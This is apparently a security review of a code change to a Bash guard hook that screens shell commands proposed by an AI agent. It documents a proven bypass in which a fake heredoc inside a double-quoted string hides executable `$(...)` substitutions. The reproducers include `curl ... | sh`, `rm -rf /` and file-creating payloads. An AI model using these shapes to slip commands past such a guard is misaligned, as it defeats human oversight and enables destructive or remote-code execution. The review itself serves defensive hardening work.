# Security Review — heredoc-classifier-fps (CodySwannGT/lisa#1958) — T3

Reviewed commits `77f4499a5` (RED fixtures) + `df5981888` (GREEN). Surface:
`plugins/.../parity-safety-net-heredoc.py` (`strip_provably_literal_body`, `Marker.quoted`,
`parse_marker`) and `parity-safety-net.sh` (`block_heredoc` remediation).
All payloads assembled from files and driven against the REAL fanned hook
(`plugins/lisa/hooks/parity-safety-net.sh`) + parser, via `/tmp/hd1958/drive.py`
(JSON stdin built with `json.dumps`; parser fed raw bytes on stdin).

**VERDICT: VETO — one CRITICAL, proven, executable-expanding regression (Finding 1).
Do not ship until the substitution-exclusion window is made to agree with bash's
actual parse.**

## Security Analysis

### Threat Model (STRIDE)

Threat model of the surface: a PreToolUse Bash guard whose job is to stop a *misled or
compromised agent* from running destructive/unclassifiable shell. The agent controls the
command text — so "attacker controls the command string" is the in-scope default, not an
extra assumption.

| Threat | Applies? | Description | Mitigation |
|--------|----------|-------------|------------|
| Spoofing | No | No identity surface. | — |
| Tampering | **Yes** | Finding 1 lets an expanding `$(...)`/`` `…` `` execute while classified benign — arbitrary file/system mutation. | Fix Finding 1. |
| Repudiation | No | — | — |
| Info Disclosure | **Yes** | The same bypass runs `$(curl … | sh)` / exfil substitutions the content guards do not target. | Fix Finding 1. |
| Denial of Service | **Yes** | Destructive commands (`rm`/`dd`) reach the shell when wrapped to dodge the content guards (Finding 1 + Finding 2). | Fix Finding 1; separately Finding 2. |
| Elevation of Privilege | **Yes** | The whole point of the wall is to constrain agent shell power; the bypass removes that constraint for a broad command shape. | Fix Finding 1. |

### Security Checklist
- [x] Input validation at system boundaries — heredoc parser + bash -n gate present…
- [ ] …but the parser's heredoc-body model **disagrees with bash** (Finding 1). **FAIL.**
- [x] No secrets in code or logs
- [x] Auth/authz — N/A (local hook)
- [x] No SQL/NoSQL injection vectors introduced
- [x] No XSS vectors
- [x] Dependencies — none added

---

### Security (proven)

#### FINDING 1 — CRITICAL, must-fix: fake-heredoc window smuggles an executable substitution past the wall
`plugins/*/hooks/parity-safety-net-heredoc.py` — `strip_provably_literal_body` (added L381-403)
trusting `top_level_markers` (L163-199, per-line quote reset) against `has_active_command_substitution`
(L301-336, cross-line quote state).

- **What:** `top_level_markers()` re-initialises quote state at the start of **every line**
  (the `state = "plain"` on L169 lives inside the `for line in lines` loop). So a
  `<<'DELIM'`-shaped line that sits **inside a multi-line double-quoted string** is registered
  as a genuine top-level quoted heredoc marker (`quoted=True`). `strip_provably_literal_body`
  then deletes that "body" window before the substitution scan. But to bash there is **no
  heredoc** — the whole thing is one double-quoted string, and `$(...)` inside a double-quoted
  string **is executed**. The excluded `$(...)` is never seen, classification falls to
  UNSUPPORTED(10), and the hook returns exit 0 (ALLOWED).
- **reproducer:** `/tmp/hd1958/p_a2_dq.txt`, `p_a3_curl.txt`, `p_a4_assign.txt`
  - `A2` (`echo "…"` wrapper):
    ```
    echo "
    cat <<'EOF'
    $(touch /tmp/hd1958/PWNED_A2)
    EOF
    "
    ```
    parser exit **10** (was **20** on `df5981888^` — old parser blocked it at the wall);
    hook exit **0 = ALLOWED**; `bash -n` PASS; running it under bash **created the sentinel file
    → the `$(…)` really executed.**
  - `A4` (assignment `template="…"`, an utterly ordinary shape): ALLOWED **and executed**.
  - `A3` (`$(curl http://…:9/x.sh | sh)` in the window): ALLOWED — an unguarded remote-code
    shape, proving the bypass is not limited to payloads the content guards happen to match.
- **impact:** Any agent-proposed Bash command of the shape *(double-quoted multi-line string
  containing a `<<'X'`-looking line, a `$(…)`/backtick line, then a line equal to `X`)* runs the
  substitution while the hook reports the command safe. That is arbitrary command execution
  (RCE / exfil / destructive) through the exact wall that exists to prevent it. Precondition is
  only "the agent emits this string," which is the guard's whole threat model. **This is a
  direct regression: `df5981888^` classified all three MALFORMED (blocked); `df5981888`
  allows them.**
- **reason:** reproducer (bash executed, sentinel proven) + bounded impact (arbitrary
  expanding substitution in the target shape) + proven old→new delta (20→10).
- **root cause / fix direction (for the builder, not applied here):** the exclusion window
  must be computed from the **same cross-line quote/heredoc state** the substitution scanner
  uses — i.e. a `<<'DELIM'` that is inside an open single/double quote (cross-line) is NOT a
  heredoc and must not create an exclusion window. Options: (a) derive `strip_provably_literal_body`
  from a single cross-line state machine shared with `has_active_command_substitution`;
  (b) before excluding, re-verify the marker is at bash-real top level under cross-line quote
  state; (c) only exclude when a cross-line scan of header+terminator+trailing already agrees
  the marker is a true heredoc. Any of these must still pass F1/F2/F3 and the header-sub control.

---

### Security (unproven)

#### FINDING 3 — LOW, robustness: `splitlines()` vs `count("\n")` line-number desync
`strip_provably_literal_body` (L397-398) mixes `command.count("\n", 0, marker.start)` for
`marker_line` with `command.splitlines()` for the body list; `top_level_markers` computes
offsets as `+1` per line (L198). Python `splitlines()` also breaks on `\r`, `\v`, `\f`,
`\x1c`, `\x85`, ` `, … which bash and the `\n`-count do **not**. A lone `\r`/unicode
separator before or inside the window therefore mis-numbers the excluded region.
- **reproducer:** `/tmp/hd1958/p_cr.txt` (`x=1\rcat <<'EOF'\n$(touch …)\nEOF\n`) — classified
  UNSUPPORTED(10)/ALLOWED, but bash did **not** execute the `$(…)` (there it is a genuine quoted
  heredoc body → correctly literal). So no executable bypass was demonstrated in the tested form.
- **impact:** `unproven` — the numbering mismatch is a latent soundness hazard and a natural
  seed for a follow-on window-shift bypass (same class as Finding 1), but I did not land an
  executable case.
- **reason:** impact unbounded / never reproduced as executable — kept here, not demoted.

---

### Out-of-scope but load-bearing (NOT introduced by #1958)

#### FINDING 2 — pre-existing content-guard blind spot for `$(…)` in double quotes
`echo "$(rm -rf /)"` (single line, no heredoc) — `/tmp/hd1958/p_rm_plain.txt` — is classified
SAFE(0) and **ALLOWED** on both `df5981888` and `df5981888^`. The rm content guard does not
match `rm` immediately inside `$(` within double quotes. This is **pre-existing**, not this PR.
It matters for severity: it means the content guards are **not a reliable backstop** when the
heredoc wall is bypassed, so Finding 1's wall regression cannot be waved off with "the guards
still catch it." (Demonstrated: `A6` = `$(rm -rf /)` in the fake window is ALLOWED — old parser
blocked it at the wall, exit 20.) Recommend a separate ticket for the `$(…)` guard-boundary gap.

---

### Positive controls that HELD (fail-safe intact — the fix must preserve these)
- **F1** (`python3 <<'EOF'` with backticks/`$(` in a *literal* body) → UNSUPPORTED/ALLOWED. ✓ (the intended fix)
- **F2** (guarded payload `os.system("rm -rf /")` in a quoted body) → BLOCKED via the rm **content guard**, not the wall. ✓
- **Command-proper sub** (`cat <<'EOF' "$(touch …)"` on the header line) → MALFORMED/BLOCKED. ✓ outside-window scan intact.
- **Single-quote outer wrapper** (`A5`) → ALLOWED but bash does **not** expand (single quotes) → harmless, correct.
- **Unclosed fake window** → `strip` returns unchanged, `has_active_command_substitution`/`marker_is_closed` → MALFORMED. ✓

### Message-conditional (item 6, cosmetic)
`block_heredoc` git-commit detector: not probed to failure; even a misfire only swaps
remediation prose (commit-`-F` vs Write-tool). No security impact. Note only.

---

### Recommendations
- **CRITICAL** — Fix Finding 1 before merge. The single/double-quote cross-line vs per-line
  parser disagreement is the root cause; make the exclusion window agree with bash's parse.
  Add the A2/A3/A4 shapes (double-quoted multi-line wrapper) as RED fixtures.
- **WARNING** — File a follow-up for Finding 2 (content guards miss `$(rm …)` in double quotes);
  it is the reason Finding 1 is CRITICAL rather than defence-in-depth-contained.
- **SUGGESTION** — Fix Finding 3 (use one line model consistently; reject or normalise `\r`/
  unicode line separators in the heredoc path as `classify_safe` already does for `\r`).
- Chained/all-quoted heredocs remaining out of scope is the right call (agreed with research §5).

### Reproducers (files under `/tmp/hd1958/`, driver `drive.py`)
| id | file | parser (old→new) | hook | bash exec | class |
|----|------|------------------|------|-----------|-------|
| A2 | p_a2_dq.txt | 20 → 10 | ALLOWED | **YES** | real gap |
| A3 | p_a3_curl.txt | 20 → 10 | ALLOWED | (curl:9 refused, shape executes) | real gap |
| A4 | p_a4_assign.txt | 20 → 10 | ALLOWED | **YES** | real gap |
| A5 | p_a5_singlequote.txt | — → 10 | ALLOWED | no | harmless |
| A6 | p_a6_rm_in_window.txt | 20 → 10 | ALLOWED | (rm, guard-blind) | gap + Finding 2 |
| hdr | p_hdr_sub.txt | 20 → 20 | BLOCKED | — | control held |
| rm-plain | p_rm_plain.txt | 0 → 0 | ALLOWED | — | Finding 2 (pre-existing) |
| CR | p_cr.txt | — → 10 | ALLOWED | no | Finding 3 (unproven) |
| F1 | p_b1_f1.txt | — → 10 | ALLOWED | — | intended fix ✓ |
| F2 | p_b2_f2.txt | — → 10 | BLOCKED(guard) | — | control held ✓ |
